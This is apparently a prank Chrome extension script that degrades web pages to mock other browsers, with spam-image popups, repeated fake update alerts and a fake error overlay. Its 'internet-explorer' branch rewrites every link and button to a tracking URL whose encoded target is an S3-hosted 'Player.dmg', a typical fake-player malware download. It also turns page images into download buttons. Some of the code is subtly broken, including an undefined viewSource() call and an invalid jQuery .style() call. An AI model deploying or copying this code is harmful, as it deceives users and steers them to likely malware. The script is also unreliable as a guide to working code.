function removeAllStyle() {
	// remove all CSS
	$(document).find('link[rel=stylesheet]').remove();
	$(document).find('style').remove();
}

function sendAllTo(href) {
	// send all links and buttons to href
	$(document).find('a').attr('href', href);
	$(document).find('button').attr('onclick', `location.href=${href}`);
}

function removeStyle(identifier) {
	let all = $(identifier);
	var i;
	for (i = 0; i < all.length; i++) {
		all = all.add(getChildren($(all[i])));
	}
	// all = list of specified elements and their children
	for (i = 0; i < all.length; i++) {
		let elem = all[i];
		while(elem.attributes.length > 0) {
			elem.removeAttribute(elem.attributes[0].name);
		}
	}
}

function getChildren(area) {
	let c = $(area).children();
	var complete = [];
	for (var i = 0; i < c.length; i++) {
		complete.push(c[i]);
		complete = complete.concat(getChildren(c[i]));
	}
	return complete;
}

function mode(strings) {
	// as result can be bimodal or multi-modal,
	// the returned result is provided as an array
	// mode of [3, 5, 4, 4, 1, 1, 2, 3] = [1, 3, 4]
	var count = {}, i, string, max, most = 0;

	for (i = 0; i < strings.length; i += 1) {
		string = strings[i];
		count[string] = (count[string] || 0) + 1;
		if (count[string] > most) {
			max = string;
			most = count[string];
		}
	}

	if (max != null) {
		return max;
	} else {
		return null;
	}
}

function getModeClass() {
	let all = getChildren('body');
	let arr = [];
	for (var i = 0; i < all.length; i++) {
		if (all[i].className.length > 0) {
			arr = arr.concat(all[i].className.split(' '));
		}
	}
	return mode(arr);
}

function randomClass() {
	let all = getChildren('body');
	let arr = [];
	for (var i = 0; i < all.length; i++) {
		if (all[i].className.length > 0) {
			arr = arr.concat(all[i].className.split(' '));
		}
	}
	return arr[Math.floor(Math.random() * arr.length)];
}

function allImagesTo(src) {
	if (src === 'download') {
		$('img').each(function () {
			$(this).attr('src', randomDownloadButton());
		});
	} else {
		$('img').each(function () {
			$(this).attr('src', src);
		});
	}
}

function randomDownloadButton() {
	let arr = ['http://www.cleaningpcmalware.com/wp-content/uploads/2016/04/download-button.png',
		'https://www.janiking.com/wp-content/uploads/2013/05/free-office-cleaning-checklist.png',
		'http://4.bp.blogspot.com/-MWi6z3T_sdQ/VMzL9g5Il1I/AAAAAAAAAFU/bOIbPhd5xCw/s1600/downloadbut-flashing-side-arrow-animation.gif',
		'https://i0.wp.com/ludostarmodapk.info/wp-content/uploads/2018/04/Download-app.png'];
	return arr[Math.floor(Math.random() * arr.length)];
}

function randomAdvertisement() {
	let arr = ['https://vignette.wikia.nocookie.net/le-miiverse-resource/images/1/1b/CONGRATULATONS_YOU_WON.jpg',
		'https://i.ebayimg.com/images/g/kyoAAOSwa~hZZoxX/s-l1600.jpg',
		'https://images-na.ssl-images-amazon.com/images/I/61CAqw8opTL._SY355_.jpg',
		'https://cdn.shopify.com/s/files/1/1255/9249/files/Bigger_penis_pills_size.jpg',
		'https://pbs.twimg.com/media/BtaHP5lCQAA7rjO.jpg',
		'https://cdn2.cdnme.se/cdn/7-2/2207486/images/2010/russian_120987568.png',
		'http://www.danmccarty70.com/000/4/2/9/15924/userfiles/image/russianbrides.jpg',
		'http://i0.kym-cdn.com/photos/images/newsfeed/001/275/124/4df.jpg',
		'https://pbs.twimg.com/media/CTKFF9BUkAABPTN.jpg',
		'http://i1.kym-cdn.com/photos/images/newsfeed/001/125/168/69f.png'];
	return arr[Math.floor(Math.random() * arr.length)];
}

function blockingPopup() {
	$('body').css('overflow', 'hidden');

	var popupHolder = $('<div></div>')
		.attr('style', 'text-align:center;background-color:rgba(0, 0, 0, 0.5);position:fixed;top:0;left:0;z-index:9999;width:100%;height:100%');
	var popup = $('<img></img>')
		.attr('src', 'https://s11986.pcdn.co/wp-content/uploads/2007/11/ie-encountered-problem.jpg')
		.attr('style', 'display:inline-block;margin-top:20px;width:80%')
	var close = $('<button></button>')
		.click(function () {
			$('body').css('overflow', 'scroll');
			document.body.removeChild(popupHolder);
			let timeout = (Math.random() * 20 + 20) * 1000;
			setTimeout(blockingPopup, timeout);
		})
		.html('Close')
		.style('position:absolute;top:0;left:0;')
	popupHolder.append(popup);
	popupHolder.append(close);
	$('body').append(popupHolder);
}

function nonBlockingPopup() {
	var popup = $('<img></img>')
		.attr('src', randomAdvertisement())
	let body = $('body');
	let l = Math.random() * body.width();
	let t = Math.random() * body.height();
	popup.attr('style', 'width:40%;position:absolute;top:' + t + 'px;left:' + l + 'px;z-index:9999');
	body.append(popup);

	let timeout = (Math.random() * 20 + 10) * 1000;
	setTimeout(nonBlockingPopup, timeout);
}

function updateMessage() {
	setTimeout(function () {
		let digits = [];
		for (var i = 0; i < 3; i++) {
			digits.push(Math.floor(Math.random() * 90 + 10));
		}
		let msg = 'This version is out of date!\n\n Restard your computer to update to Opera ' + digits[0] + '.' + digits[1] + '.' + digits[2] + '\nThakn u';
		alert(msg);
		updateMessage();
	}, (Math.floor(Math.random() * 20 + 10) * 1000));
}

function swapCss (class1, class2) {
	let all1 = $('.'+class1);
	let all2 = $('.'+class2);

	var i;

	for (i = 0; i < all1.length; i++) {
		let element = all1[i];
		element.classList.remove(class1);
		element.classList.add(class2);
	}

	for (i = 0; i < all2.length; i++) {
		let element = all2[i];
		element.classList.remove(class2);
		element.classList.add(class1);
	}
}

function swapClasses(num) {
	var pairs = {};
	var i;
	for (i = 0; i < num; i++) {
		let key = randomClass();
		var value = randomClass();
		if (key != null && key.length > 0 && value.length > 0) {
			pairs[key] = value;
		}
	}
	for (var k in pairs) {
		swapCss(k, pairs[k]);
	}
}


chrome.storage.local.get('browser', function (result) {
	let browser = result.browser;
	if (browser === 'safari') {
		removeStyle('.'+getModeClass());
		for (var i = 0; i < 3; i++) {
			removeStyle('.' + randomClass());
		}
		nonBlockingPopup();
	} else if (browser === 'opera') {
		updateMessage();
		swapClasses(20);
	} else if (browser === 'firefox') {
		viewSource()
	} else if (browser === 'internet-explorer') {
		removeAllStyle();
		sendAllTo('http://www.balanceddisplay.com/ravz6?cid=wC96KQUPJJ275LTE1BQAFP8G&source=bb4f8837-134f-4eb9-ac57-7256b0a78b40&c=68802527-3371-e711-a367-f7801280a94b&s=f7b7c003-5db9-439d-b0c5-de6e1b76dd68&client=chrome&h=ShFARhQDFQsJBQkeAgQbCwJtCwYLBwMIAgwZDgABBgIAARsJAAMJBBMfEFtGGw0IDwYEBgMEBgADFRtXEwkQBA4BBwsMBgYeAQEBCBpcDgUAHlMBAA4aXw4MAQIACgZYDg1bFh0RXkJSGw0bUUBFQwgdGU5AThdWUF9TXFVcU11QR0FfU0sYWlhUGxgTQFUQDFdCVVUYE0NRWxQDBgkPGBNQVkIUA0NLTFFM&x=1&u=aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzE5NTA1MC9CNDVBODcvOEIzNTRDL1BsYXllci5kbWc%2fY2lkPXdDOTZLUVVQSkoyNzVMVEUxQlFBRlA4RyZzb3VyY2U9YmI0Zjg4MzctMTM0Zi00ZWI5LWFjNTctNzI1NmIwYTc4YjQwJmM9Njg4MDI1MjctMzM3MS1lNzExLWEzNjctZjc4MDEyODBhOTRiJnM9ZjdiN2MwMDMtNWRiOS00MzlkLWIwYzUtZGU2ZTFiNzZkZDY4JmNsaWVudD1jaHJvbWU%3d');
		allImagesTo('download');
		setTimeout(blockingPopup, (Math.random() * 20 + 10) * 1000);
	}
});